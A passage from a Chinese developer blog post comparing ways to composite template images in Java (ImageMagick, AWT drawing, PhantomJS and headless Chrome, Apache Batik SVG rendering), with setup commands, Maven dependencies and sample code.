1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465private static DOMParser domParser;static { domParser = new DOMParser(new HTMLConfiguration()); try { domParser.setProperty(\"http://cyberneko.org/html/properties/names/elems\", \"lower\"); } catch (Exception e) { throw new RuntimeException(\"Can't create HtmlParserImpl\", e); }}private Document parseDocument(String content) throws Exception { domParser.parse(new InputSource(new StringReader(content))); return domParser.getDocument();}private String readHtmlContent(String url) throws Exception { InputStream in = HttpUtil.downFile(url); StringBuilder out = new StringBuilder(); byte[] b = new byte[4096]; for (int n; (n = in.read(b)) != -1; ) { out.append(new String(b, 0, n)); } return out.toString();}@Testpublic void testRender() { try { String url = \"http://www.baidu.com\"; Document doc = parseDocument(readHtmlContent(url)); int width = 800; int height = 1024; Graphics2DRenderer renderer = new Graphics2DRenderer(); renderer.setDocument(doc, doc.getDocumentURI()); BufferedImage bufferedImage = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB); Graphics2D graphics2D = GraphicUtil.getG2d(bufferedImage); // do layout with temp buffer renderer.layout(graphics2D, new Dimension(width, height)); graphics2D.dispose(); Rectangle size = renderer.getMinimumSize(); final int autoWidth = width; final int autoHeight = (int) size.getHeight(); bufferedImage = new BufferedImage(autoWidth, autoHeight, BufferedImage.TYPE_INT_RGB); Dimension dimension = new Dimension(autoWidth, autoHeight); graphics2D = GraphicUtil.getG2d(bufferedImage); renderer.layout(graphics2D, dimension); renderer.render(graphics2D); graphics2D.dispose(); System.out.println(\"---------\"); } catch (Exception e) { e.printStackTrace(); }} 结果输出图片为空白的页面，为啥？ 仔细去看百度的网页，发现没有dom结构，一堆的js和css代码，换个本地的html来试一下，输出效果还不错，我之前做了一个小工具，实现markdown转image，就是用的这个框架做中转，将markdown生成的html渲染为图片，当然复杂一点的css就不行了 相信看到这里，这个库的缺陷也好很明显了，不适合生产环境，自己玩玩还行 过于古老，基本没人维护 对html的格式有要求 复杂的css没法玩 指定宽度也比较恶心 c. 借助转pdf的包java中，提供html转pdf的包还不少，借助这些工具，也是可以间接实现这个功能的，具体的就不贴了，可以用的不少，收钱的，免费的都有 推荐几个搞标记的 flyingsaucer openhtmltopdf itext d. 小结基本上，没有找到合乎心意的转换包，其实有些包也不错，如果深入进去改一波，应该也能使用，然实际就是深入进去，基本上挖不动 1. imagemagic的合成大名鼎鼎的图片处理工具，c++的，可以提供图片的各种姿势的操作，当然也包括了图片合成，要玩这个，首先得搭建这个环境（这个成本比上面会大一点） a. 环境准备简单搭建方式： 12345678yum install libjpeg-develyum install libpng-devel# 本地环境搭建sudo brew install jpegsudo brew install libpngsudo brew install GraphicsMagick 搭建完毕后，测试先是否可用 1234## 搭建完毕，开始测试gm convert input.jpg -thumbnail &apos;100x100&apos; output_1.jpggm convert -crop 640x960+0+0 test.jpg output.jpg 如果上面的搞不定，也可以用下面的下载包的方式安装 12345678910111213141516安装jpeg 包 `wget ftp://223.202.54.10/pub/web/php/libjpeg-6b.tar.gz`安装webp 包 `wget http://www.imagemagick.org/download/delegates/libwebp-0.5.1.tar.gz`安装png 包 `wget http://www.imagemagick.org/download/delegates/libpng-1.6.24.tar.gz`安装 graphicsmagick `wget http://nchc.dl.sourceforge.net/project/graphicsmagick/graphicsmagick/1.3.22/GraphicsMagick-1.3.22.tar.gz`## ----------make distclean ## 清楚上次make的东西imagemagick ：`wget http://www.imagemagick.org/download/ImageMagick.tar.gz`安装命令 `sudo ./configure; sudo make; sudo make install`裁图命令 `convert test.jpg -crop 640x960+0+0 output.jpg` linux 安装imagemagick 发现一直找不到 png的依赖， linux 安装之后，可能有两个问题 imagemagick 依然无法读取png图片 查阅需要安装 http://pkgconfig.freedesktop.org/releases/pkg-config-0.28.tar.gz 执行 convert 提示linux shared libraries 不包含某个库 临时解决方案： export LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH 一劳永逸的方案：https://my.oschina.net/guanyue/blog/220264 vi /etc/ld.so.conf 在这个文件里加入：/usr/local/lib 来指明共享库的搜索位置 然后再执行/sbin/ldconf b. java调用当然，我们是java的后端，现在就需要用java来调用imagemagic的执行了 依赖包 12345&lt;dependency&gt; &lt;groupId&gt;org.im4java&lt;/groupId&gt; &lt;artifactId&gt;im4java&lt;/artifactId&gt; &lt;version&gt;1.4.0&lt;/version&gt;&lt;/dependency&gt; 下面给一个图片裁剪的测试 123456789101112131415161718192021222324252627282930313233/** * 裁剪图片 * * @param imagePath 源图片路径 * @param outPath 处理后图片路径 * @param x 起始X坐标 * @param y 起始Y坐标 * @param width 裁剪宽度 * @param height 裁剪高度 * @return 返回true说明裁剪成功, 否则失败 */public static boolean cut(String imagePath, String outPath, int x, int y, int width, int height) { boolean flag; try { IMOperation op = new IMOperation(); op.addImage(imagePath); /** width：裁剪的宽度 * height：裁剪的高度 * x：裁剪的横坐标 * y：裁剪纵坐标 */ op.crop(width, height, x, y); op.addImage(outPath); // 传true到构造函数中,则表示使用GraphicMagic, 裁图时,图片大小会变 ConvertCmd convert = new ConvertCmd(); convert.run(op); flag = true; } catch (IOException e) { flag = false; } catch (InterruptedException e) { flag = false; } catch (IM4JavaException e) { flag = false; } return flag;} 具体使用姿势就不说了，这个框架本身是支持简单的图片合成的，几张图和一下，加上文字水印啥的，主要说一下有什么问题 图片合成参数不是一般的复杂，想实现一个模板的合成，这个命令可以说很难完美的写出来 性能一般般 总得来说，这个用来做图片的基本操作还很好，真心不太合适复杂点的图片合成，分分钟虐哭 c. 其他一些不得不说的故事说到imagemagic，就不得不说graphicmagic，两者基本差不多，有说法是 graphicmagic的性能要高与imagemagic，那么我们为什么选择 imagemagic graphicmagic 处理jpg图片，会有精度丢失的问题（不知道是不是我的使用姿势不对，同样的case，imagemagic不会） 公司的基线是支持imagemagic的 很久以前写了一篇博文，就是如何利用 imagegraphic 搭建一个图片处理服务器的 im4java + imagemagic 搭建一个图片处理服务 2. awt的绘制利用java的awt包，也是可以实现绘图的，而且功能也比较强大，完全可以实现各种姿势的绘图场景, 一个case如 : 上面这个图的合成，就是基于awt做到的，这一张图，我们需要做些什么？ 图片的绘制 圆角图片 文字输出 文字对其方式 直线 矩形 纯色背景 一般来将，上面几种场景的支持，可以满足绝大多数的合图要求，接下来看一下是如何支持上面的几种case的 o. 接口定义定义一个基本的绘图单元接口 12public interface IDrawBO {} a. 图片 ： ImgBO图片的定义比较简单，一般只需要知道坐标，和宽高就ok了，所以我们的定义如下 123456789101112131415@Data@NoArgsConstructor@AllArgsConstructorpublic class ImgBO implements IDrawBO { private BufferedImage image; private int x; private int y; private int w; private int h;} b. 文字：FontBO文字相比较图片就有些额外的区别，有字体，样式、颜色，坐标，删除线 1234567891011121314151617@Data@NoArgsConstructor@AllArgsConstructorpublic class FontBO implements IDrawBO { private String msgs; private Font font; private Color color; private int x; private int y; private boolean deleted = false;} c. 直线: LineBO直线，除了我们常规的起点坐标，末尾坐标之外，颜色的设置，虚线样式也是常见的属性 123456789101112131415161718192021222324@Datapublic class LineBO implements IDrawBO { public static final Stroke DEFAULT_STROKE = new BasicStroke(2, BasicStroke.CAP_BUTT, BasicStroke.JOIN_ROUND, 3.5f, new float[]{12, 6, 6, 6}, 0f); private Color color; private int x1; private int y1; private int x2; private int y2; /** * 是否是虚线 */ private boolean dashed;} d. 矩形： RoundRectBO和直线的属性差不多, 但是会多一些有意思的东西，如是否为圆角矩形 1234567891011121314151617181920212223242526272829public class RoundRectBO implements IDrawBO { public static final Stroke DEFAULT_DASH = new BasicStroke(1, BasicStroke.CAP_BUTT, BasicStroke.JOIN_ROUND, 3.5f, new float[]{4, 2,}, 0f); private int x; private int y; private int w; private int h; private Color color; /** * 是否为虚线 */ private boolean dashed; /** * 圆角弧度 */ private int radius;} e. 纯色： ColorBgBO纯色背景，相比较其他的会多一个透明度的属性，主要是因为很多场景下，会做一层纯色的浮层 1234567891011121314151617@Datapublic class ColorBgBO implements IDrawBO { private Color color; private int w; private int h; private int x; private int y; private int radius; private boolean transparence;} 上面定义了这些BO对象，仅仅是定义又什么用？接下来就需要实现对BO对象的绘制，也是核心的逻辑层了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101/** * Created by yihui on 2017/9/21. */public interface IShareModule { void draw(Graphics2D g2d); default void drawFont(Graphics2D g2d, FontBO fontBo) { if (fontBo != null) { g2d.setFont(fontBo.getFont()); g2d.setColor(fontBo.getColor()); g2d.drawString(fontBo.getMsgs(), fontBo.getX(), fontBo.getY()); if (fontBo.isDeleted()) { // 删除时，需要在文字上绘制一条删除线 FontMetrics fontMetrics = FontUtil.getFontMetric(fontBo.getFont()); int y = fontBo.getY() - (fontBo.getFont().getSize() &gt;&gt; 1) + fontMetrics.getDescent(); int w = fontMetrics.stringWidth(fontBo.getMsgs()); g2d.drawLine(fontBo.getX(), y, fontBo.getX() + w, y); } } } default void drawImage(Graphics2D g2d, ImgBO imgBo) { if (imgBo != null) { g2d.drawImage(imgBo.getImage(), imgBo.getX(), imgBo.getY(), imgBo.getW(), imgBo.getH(), null); } } default void drawLine(Graphics2D g2d, LineBO lineBO) { if(lineBo == null) return; g2d.setColor(lineBO.getColor()); if (lineBO.isDashed()) { Stroke stroke = g2d.getStroke(); g2d.setStroke(LineBO.DEFAULT_STROKE); g2d.drawLine(lineBO.getX(), lineBO.getY(), lineBO.getX() + lineBO.getW(), lineBO.getY()); g2d.setStroke(stroke); } else { g2d.drawLine(lineBO.getX(), lineBO.getY(), lineBO.getX() + lineBO.getW(), lineBO.getY()); } } default void drawRoundRect(Graphics2D g2d, RoundRectBO roundRectBO) { if(roundRectBO == null) return; g2d.setColor(roundRectBO.getColor()); if (!roundRectBO.isDashed()) { g2d.drawRoundRect(roundRectBO.getX(), roundRectBO.getY(), roundRectBO.getW(), roundRectBO.getH(), roundRectBO.getRadius(), roundRectBO.getRadius()); } else { Stroke stroke = g2d.getStroke(); g2d.setStroke(RoundRectBO.DEFAULT_DASH); g2d.drawRoundRect(roundRectBO.getX(), roundRectBO.getY(), roundRectBO.getW(), roundRectBO.getH(), roundRectBO.getRadius(), roundRectBO.getRadius()); g2d.setStroke(stroke); } if (roundRectBO.getSpaceW() &gt; 0) { // 上边距空白的宽度 int x = roundRectBO.getX() + (roundRectBO.getW() - roundRectBO.getSpaceW() &gt;&gt; 1); int y = roundRectBO.getY() - 2; int w = roundRectBO.getSpaceW(); int h = 4; g2d.setColor(roundRectBO.getSpaceColor()); g2d.fillRect(x, y, w, h); } } default void drawColorBG(Graphics2D g2d, ColorBgBO color) { if(color == null) return; g2d.setColor(color.getColor()); Composite composite = null; if (color.isTransparence()) { composite = g2d.getComposite(); g2d.setComposite(AlphaComposite.Src); } if (color.getRadius() == 0) { g2d.fillRect(color.getX(), color.getY(), color.getW(), color.getH()); } else { g2d.fill(new RoundRectangle2D.Float(color.getX(), color.getY(), color.getW(), color.getH(), color.getRadius(), color.getRadius())); } if (color.isTransparence()) { g2d.setComposite(composite); } }} 上面配合起来使用，就可以实现基本的模板图片的合成需求了，当然我们提供的服务比上面列出的要丰富一些，我们还支持 图片的处理：圆角，裁剪贴图 文字对齐：三种对齐方式，自动换行 小结&amp;问题上面虽然说可以支持合图的需求，但有个最大的问题，就是对后端的工作太多，每个模板，都需要后端来配合，进行参数指定，联调，极其繁琐和费时费力，分分钟搞死人 对这种方式，想的一个方法是，采用搭积木的方式支持，事先定义一系列的基本绘图组建，然后前端自己填入参数来组装 当然没有做，原因也很简单，接口太复杂，对前端不友好，没人愿意这么用，换成我也是不想这么干的 3. html 转 图片接着又来的是一个猥琐的方案，html转图，到github上一搜，发现还是js靠谱，比较多，一种常见的思路是： 采用无界面浏览器加载html页面，然后截图 在无界面浏览器中，非常有名的是 phantomjs，以及后起之秀chrome，这里主要说一下phantomjs的接入方式，简单提起chrmoe的无界面使用方式 a. 环境准备phantomjs 安装 12345678910111213141516171819202122232425262728293031# 1. 下载## mac 系统wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-macosx.zip## linux 系统wget https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-2.1.1-linux-x86_64.tar.bz2## windows 系统## 就不要玩了，没啥意思# 2. 解压sudo su tar -jxvf phantomjs-2.1.1-linux-x86_64.tar.bz2# 如果解压报错，则安装下面的# yum -y install bzip2# 3. 安装## 简单点，移动到bin目录下cp phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/local/bin# 4. 验证是否okphantomjs --version# 输出版本号，则表示ok pom依赖 1234567891011121314151617181920&lt;!--phantomjs --&gt;&lt;dependency&gt; &lt;groupId&gt;org.seleniumhq.selenium&lt;/groupId&gt; &lt;artifactId&gt;selenium-java&lt;/artifactId&gt; &lt;version&gt;2.53.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.detro&lt;/groupId&gt; &lt;artifactId&gt;ghostdriver&lt;/artifactId&gt; &lt;version&gt;2.1.0&lt;/version&gt;&lt;/dependency&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;jitpack.io&lt;/id&gt; &lt;url&gt;https://jitpack.io&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt; b. 实测思路比较清晰，在服务器上搭建一个phantomjs服务，然后java来调用，主要借助的是selenium和ghostdriver两个开源包，额外提一句，selenium在自动化测试和爬虫使用中非常有名，有兴趣的可以自己搜索相关资料，非常有意思的一个东西 图片渲染的主要业务逻辑： 12345678910111213141516171819202122232425262728public class Html2ImageByJsWrapper { private static PhantomJSDriver webDriver = getPhantomJs(); private static PhantomJSDriver getPhantomJs() { //设置必要参数 DesiredCapabilities dcaps = new DesiredCapabilities(); //ssl证书支持 dcaps.setCapability(&quot;acceptSslCerts&quot;, true); //截屏支持 dcaps.setCapability(&quot;takesScreenshot&quot;, true); //css搜索支持 dcaps.setCapability(&quot;cssSelectorsEnabled&quot;, true); //js支持 dcaps.setJavascriptEnabled(true); //驱动支持（第二参数表明的是你的phantomjs引擎所在的路径，which/whereis phantomjs可以查看） // fixme 这里写了执行， 可以考虑判断系统是否有安装，并获取对应的路径 or 开放出来指定路径 dcaps.setCapability(PhantomJSDriverService.PHANTOMJS_EXECUTABLE_PATH_PROPERTY, &quot;/usr/local/bin/phantomjs&quot;); //创建无界面浏览器对象 return new PhantomJSDriver(dcaps); } public static BufferedImage renderHtml2Image(String url) throws IOException { webDriver.get(url); File file = webDriver.getScreenshotAs(OutputType.FILE); return ImageIO.read(file); }} 那么测试case就很好写了 12345@Testpublic void testRender() throws IOException { String url = &quot;https://www.baidu.com&quot;; BufferedImage img = Html2ImageByJsWrapper.renderHtml2Image(url);} 输出图片 看到这个结果之后，是否会觉得已经完美了？ 然而并不是，测试一些需要异步请求的接口，比较渣，性能差，返回的样式会错乱 c. 分析小结这个方案从实现来讲，是没有什么问题的，从支持情况来说，问题其实也不太大，那为什么不用这个方案呢？ 这个方案的支持，原本我的希望是前端传给我们需要渲染的html 是直出好的页面 所有的dom结构已经很清晰了， 尽量不要有什么js， 不要有异步请求， 不要又复杂的css依赖， 没有大量的图片 然而事与愿违，至于为什么不实现这样的html，我也不太懂前端的技术难点在哪，不好多评，那么也就只好转方案了 还有一点，对这个方案我不太满意的就是性能太渣，而且我也不知道可以怎么去优化，简单来讲，就是这个js渲染，完全不在我的把控之内，有什么问题、如何去优化、如何防止ssrf攻击，我都没有好的解决办法，所以我本人也是不喜欢这个方案的 d. chrome 方式chrome浏览器，大家都知道，chrome还有一种无界面启动方式，可能知道的比较少了 只要你本机安装了chrome浏览器，打开控制台就可以愉快的玩耍了，html输出图片的指令为 12345## 输出pdf/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --headless --print-to-pdf http://www.baidu.com## 输出图片/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --headless --screenshot http://www.baidu.com 输出截图 说明 chrome headless有很多指令，可设置窗口的大小解决上面的边框问题，有兴趣的可以百度 4. svg 转 图片然后万能的前端同学又提出了svg渲染图片，在提这个之前，完全没接触过svg，也不知道svg是个什么鬼，更不知道svg能不能渲染出图片（最重要的是java有没有现成可用的库） 查了一番，不错，发现apace有个batik，就是干这个事情的 插播一句，感觉无论多偏的东西，apache或者是google都至少有那么一个可以支持的开源项目，虽然有不少都已经不怎么维护了 a. 依赖整理依赖包有那么点多 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990&lt;!--batik svg to image--&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.xmlgraphics&lt;/groupId&gt; &lt;artifactId&gt;batik-svggen&lt;/artifactId&gt; &lt;version&gt;1.8&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.xmlgraphics&lt;/groupId&gt; &lt;artifactId&gt;batik-bridge&lt;/artifactId&gt; &lt;version&gt;1.8&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;xalan&lt;/groupId&gt; &lt;artifactId&gt;xalan&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.xmlgraphics&lt;/groupId&gt; &lt;artifactId&gt;batik-dom&lt;/artifactId&gt; &lt;version&gt;1.8&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;xalan&lt;/groupId&gt; &lt;artifactId&gt;xalan&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.xmlgraphics&lt;/groupId&gt; &lt;artifactId&gt;batik-parser&lt;/artifactId&gt; &lt;version&gt;1.8&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.xmlgraphics&lt;/groupId&gt; &lt;artifactId&gt;batik-svg-dom&lt;/artifactId&gt; &lt;version&gt;1.8&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.xmlgraphics&lt;/groupId&gt; &lt;artifactId&gt;batik-transcoder&lt;/artifactId&gt; &lt;version&gt;1.8&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.xmlgraphics&lt;/groupId&gt; &lt;artifactId&gt;batik-util&lt;/artifactId&gt; &lt;version&gt;1.8&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.xmlgraphics&lt;/groupId&gt; &lt;artifactId&gt;batik-xml&lt;/artifactId&gt; &lt;version&gt;1.8&lt;/version&gt;&lt;/dependency&gt;&lt;!-- https://mvnrepository.com/artifact/org.apache.xmlgraphics/xmlgraphics-commons --&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.xmlgraphics&lt;/groupId&gt; &lt;artifactId&gt;xmlgraphics-commons&lt;/artifactId&gt; &lt;version&gt;2.1&lt;/version&gt;&lt;/dependency&gt;&lt;!-- https://mvnrepository.com/artifact/org.apache.xmlgraphics/batik-codec --&gt;&lt;dependency&gt; &lt;groupId&gt;org.apache.xmlgraphics&lt;/groupId&gt; &lt;artifactId&gt;batik-codec&lt;/artifactId&gt; &lt;version&gt;1.8&lt;/version&gt;&lt;/dependency&gt; &lt;!-- 此处不能使用2.9.1版本，使用2.9.1生成png会失败 --&gt;&lt;!--&lt;dependency&gt;--&gt; &lt;!--&lt;groupId&gt;xerces&lt;/groupId&gt;--&gt; &lt;!--&lt;artifactId&gt;xercesImpl&lt;/artifactId&gt;--&gt; &lt;!--&lt;version&gt;2.5.0&lt;/version&gt;--&gt;&lt;!--&lt;/dependency&gt;--&gt;&lt;dependency&gt; &lt;groupId&gt;xml-apis&lt;/groupId&gt; &lt;artifactId&gt;xmlParserAPIs&lt;/artifactId&gt; &lt;version&gt;2.0.2&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.axsl.org.w3c.dom.svg&lt;/groupId&gt; &lt;artifactId&gt;svg-dom-java&lt;/artifactId&gt; &lt;version&gt;1.1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;xml-apis&lt;/groupId&gt; &lt;artifactId&gt;xml-apis&lt;/artifactId&gt; &lt;version&gt;2.0.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.w3c.css&lt;/groupId&gt; &lt;artifactId&gt;sac&lt;/artifactId&gt; &lt;version&gt;1.3&lt;/version&gt;&lt;/dependency&gt; b. 实测一个简单的接口支持 12345678910111213141516171819202122232425262728293031323334public static void convertToPngByFile(String path, OutputStream outputStream, Map&lt;String, String&gt; parmMap) throws TranscoderException, IOException { try { // 1. 加载document File file = new File(path); String parser = XMLResourceDescriptor.getXMLParserClassName(); SAXSVGDocumentFactory f = new SAXSVGDocumentFactory(parser); Document doc = f.createDocument(file.toURI().toString()); // 2. 遍历参数，填充渲染的svg节点 Set&lt;String&gt; keySet = parmMap.keySet(); for (Map.Entry&lt;String, String&gt; entry : parmMap.entrySet()) { doc.getElementById(entry.getKey()).setTextContent(entry.getValue()); } // 3. 输出图片 PNGTranscoder t = new PNGTranscoder(); TranscoderInput input = new TranscoderInput(doc); TranscoderOutput output = new TranscoderOutput(outputStream); t.transcode(input, output); outputStream.flush(); } catch (Exception e) { e.printStackTrace(); } finally { if (outputStream != null) { try { outputStream.close(); } catch (IOException e) { e.printStackTrace(); } } }} 上面主要是为了演示下使用姿势，实际的项目中肯定不会这么简陋，官方使用链接: https://xmlgraphics.apache.org/batik/using/transcoder.html 分析下主要流程 解析svg文件，加载Document对象 根据传入的参数，填充Document中的节点 渲染输出图片 测试演示就不来了，最终方案就是这个，成品也没啥好说的 c. 问题 文本的边框支持问题: 即 outline属性 测试了好久，发现不支持这个属性 图片内容替换与文本内容替换是不一样的，需要区分对待 多个标签填充同样的内容时 从接口上来看，支持一个根据Name来获取节点功能，但是实际测试，发现标签name属性，并没有什么鸟用；不知道是使用姿势问题还是别的 然后翻看源码，发现当多个标签的id相同时，在Document的底层存储单元中，elementById 这个Map结构中，value会是一个数组 然后自然而然的想法就是，直接遍历这个数组，依次填充内容就好；结果发现压根就没有暴露这个接口，而这个属性是protectd，也无法直接访问 然后采用反射获取这个属性值，来绕过限制 模板加载缓存 实际场景中，模板往往是固定的，每次都进行渲染是非常消耗性能的，因此想的是能不能缓存住这个Document，再使用的时候，直接深拷贝一个对象出来，这样就避免了重复加载的开销 直接使用 AbstractDocumen#deepClone(true) 方法 然后，出现了一个鬼畜的并发问题，这个单独领出来细说，此处不展开 III. 最后收尾鉴于篇幅太长，有一些有意思的东西没有深入展开，特别是svg方案的支持中，遇到了一些比较有趣的问题，也涉及到三个好玩的知识点： 深拷贝+反射+并发，后面准备等这一块完结之后，好好的沉淀下，分析下这个case 1. 吐槽后端支持已经很勉强了，请大家都友好点，比如下面几个我实在支持不了 自定义设置字体（jdk字体，没新加一个都需要pe安装到jre的字体库） 图片的左上角圆角（暂时没想到好的解决方法） 渐变色（这个有点难） 这个需求，做得比较恶心，支持得也比较蛋疼，实现得比较猥琐，调bug修问题也比较闹心，总得来说，是一个开始前很有趣，做时让人吐血又很不爽，做完之后又特么的很有收获的需求 发现特别能有收获的事情，往往不是哪种做的特别爽的需求（爽，是因为这些东西你都完全能hold住，没什么难度了），相反是那些让你很闹心，完全不想继续下去的需求（因为你不了解，但是又不得不支持，还会遇到一堆鬼畜的bug，做完简直是吐血三升） 2. 小结图片合成的方式，我想应该不仅限于上面几种，由于限制于见识，终究是没有一个让人特别满意的方案，简单小结下上面的几种case java的开源包 html2image, xhtmlrender, pdfTech 一般来说，不怎么好用，大多不维护状态，对CSS的支持友好度待检验 imagemagic 适用于图片的基本处理，合图太复杂 awt绘图 属于基本的接口了，啥都可以干，只要你可以弄出来 但是工作量太大 js实现html渲染 phantmjs，效果不错，性能略渣，异步请求不友好，且完全不可控 chrome 性能由于上面的 svg渲染 batik 并不能非常完美的支持svg的渲染，有较多的限制要求，各种属性的必填，某些style的无法支持等 基本场景的支持，ok，优化后，性能高于html渲染，且可控 III. 其他体验网址基于react写了个前端，可以来体验渲染 phantomJs渲染 svg渲染 个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2017/12/17/图片合成支持的前世今生/"}],"tags":[{"name":"面试","slug":"面试","link":"/hexblog/tags/面试/"},{"name":"知识汇总","slug":"知识汇总","link":"/hexblog/tags/知识汇总/"},{"name":"泛型","slug":"泛型","link":"/hexblog/tags/泛型/"},{"name":"多线程","slug":"多线程","link":"/hexblog/tags/多线程/"},{"name":"Mysql","slug":"Mysql","link":"/hexblog/tags/Mysql/"},{"name":"Nginx","slug":"Nginx","link":"/hexblog/tags/Nginx/"},{"name":"Java","slug":"Java","link":"/hexblog/tags/Java/"},{"name":"Spring","slug":"Spring","link":"/hexblog/tags/Spring/"},{"name":"Bugfix","slug":"Bugfix","link":"/hexblog/tags/Bugfix/"},{"name":"Guava","slug":"Guava","link":"/hexblog/tags/Guava/"},{"name":"Yaml","slug":"Yaml","link":"/hexblog/tags/Yaml/"},{"name":"Git","slug":"Git","link":"/hexblog/tags/Git/"},{"name":"技术方案","slug":"技术方案","link":"/hexblog/tags/技术方案/"},{"name":"Linux","slug":"Linux","link":"/hexblog/tags/Linux/"},{"name":"时间窗口","slug":"时间窗口","link":"/hexblog/tags/时间窗口/"},{"name":"JVM","slug":"JVM","link":"/hexblog/tags/JVM/"},{"name":"Maven","slug":"Maven","link":"/hexblog/tags/Maven/"},{"name":"InfluxDB","slug":"InfluxDB","link":"/hexblog/tags/InfluxDB/"},{"name":"Vue","slug":"Vue","link":"/hexblog/tags/Vue/"},{"name":"MD5","slug":"MD5","link":"/hexblog/tags/MD5/"},{"name":"Groovy","slug":"Groovy","link":"/hexblog/tags/Groovy/"},{"name":"JDK","slug":"JDK","link":"/hexblog/tags/JDK/"},{"name":"BugFix","slug":"BugFix","link":"/hexblog/tags/BugFix/"},{"name":"Shell","slug":"Shell","link":"/hexblog/tags/Shell/"},{"name":"ReactJS","slug":"ReactJS","link":"/hexblog/tags/ReactJS/"},{"name":"hexo","slug":"hexo","link":"/hexblog/tags/hexo/"},{"name":"SpringBoot","slug":"SpringBoot","link":"/hexblog/tags/SpringBoot/"},{"name":"Python","slug":"Python","link":"/hexblog/tags/Python/"},{"name":"教程","slug":"教程","link":"/hexblog/tags/教程/"},{"name":"Redis","slug":"Redis","link":"/hexblog/tags/Redis/"},{"name":"Mongo","slug":"Mongo","link":"/hexblog/tags/Mongo/"},{"name":"手记","slug":"手记","link":"/hexblog/tags/手记/"},{"name":"RabbitMQ","slug":"RabbitMQ","link":"/hexblog/tags/RabbitMQ/"},{"name":"time","slug":"time","link":"/hexblog/tags/time/"},{"name":"Map","slug":"Map","link":"/hexblog/tags/Map/"},{"name":"FastJson","slug":"FastJson","link":"/hexblog/tags/FastJson/"},{"name":"WebSocket","slug":"WebSocket","link":"/hexblog/tags/WebSocket/"},{"name":"List","slug":"List","link":"/hexblog/tags/List/"},{"name":"序列化","slug":"序列化","link":"/hexblog/tags/序列化/"},{"name":"jdk","slug":"jdk","link":"/hexblog/tags/jdk/"},{"name":"python","slug":"python","link":"/hexblog/tags/python/"},{"name":"gitalk","slug":"gitalk","link":"/hexblog/tags/gitalk/"},{"name":"Docker","slug":"Docker","link":"/hexblog/tags/Docker/"},{"name":"知识点汇总","slug":"知识点汇总","link":"/hexblog/tags/知识点汇总/"},{"name":"数据库","slug":"数据库","link":"/hexblog/tags/数据库/"},{"name":"容器","slug":"容器","link":"/hexblog/tags/容器/"},{"name":"方案设计","slug":"方案设计","link":"/hexblog/tags/方案设计/"},{"name":"Socket","slug":"Socket","link":"/hexblog/tags/Socket/"},{"name":"反射","slug":"反射","link":"/hexblog/tags/反射/"},{"name":"乱码","slug":"乱码","link":"/hexblog/tags/乱码/"},{"name":"markdown","slug":"markdown","link":"/hexblog/tags/markdown/"},{"name":"ProtoStuff","slug":"ProtoStuff","link":"/hexblog/tags/ProtoStuff/"},{"name":"InputStream","slug":"InputStream","link":"/hexblog/tags/InputStream/"},{"name":"HashMap","slug":"HashMap","link":"/hexblog/tags/HashMap/"},{"name":"OGNL","slug":"OGNL","link":"/hexblog/tags/OGNL/"},{"name":"AutoCloseable","slug":"AutoCloseable","link":"/hexblog/tags/AutoCloseable/"},{"name":"Node","slug":"Node","link":"/hexblog/tags/Node/"},{"name":"BloomFilter","slug":"BloomFilter","link":"/hexblog/tags/BloomFilter/"},{"name":"Solr","slug":"Solr","link":"/hexblog/tags/Solr/"},{"name":"MySql","slug":"MySql","link":"/hexblog/tags/MySql/"},{"name":"时区","slug":"时区","link":"/hexblog/tags/时区/"},{"name":"问题记录","slug":"问题记录","link":"/hexblog/tags/问题记录/"},{"name":"MongoDb","slug":"MongoDb","link":"/hexblog/tags/MongoDb/"},{"name":"QuickAlarm","slug":"QuickAlarm","link":"/hexblog/tags/QuickAlarm/"},{"name":"MongoDB","slug":"MongoDB","link":"/hexblog/tags/MongoDB/"},{"name":"SSL","slug":"SSL","link":"/hexblog/tags/SSL/"},{"name":"AES","slug":"AES","link":"/hexblog/tags/AES/"},{"name":"Chrome","slug":"Chrome","link":"/hexblog/tags/Chrome/"},{"name":"CURL","slug":"CURL","link":"/hexblog/tags/CURL/"},{"name":"DNS","slug":"DNS","link":"/hexblog/tags/DNS/"},{"name":"吐槽","slug":"吐槽",